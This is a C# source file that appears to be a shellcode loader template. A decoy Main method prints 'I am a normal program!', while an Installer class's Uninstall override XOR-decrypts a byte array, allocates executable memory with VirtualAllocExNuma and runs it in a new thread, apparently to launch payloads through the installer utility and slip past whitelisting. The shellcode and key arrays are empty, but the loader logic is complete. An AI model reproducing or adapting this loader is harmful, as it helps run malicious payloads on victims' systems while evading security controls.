using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;

public class Program
{
    public static void Main()
    {
        // Generic code execution
        Console.WriteLine("I am a normal program!");
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : Installer
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle,UInt32 dwMilliseconds);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        
        byte[] buf = new byte[] {  };

        byte[] key = new byte[] {  };

        // Decrypt the shellcode using XOR
        //byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)(buf[i] ^ key[i % key.Length]);
        }

        // Step 2: Allocate memory in the current process
        int size = buf.Length;

        IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, (UInt32)size, 0x1000, 0x40, 0);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
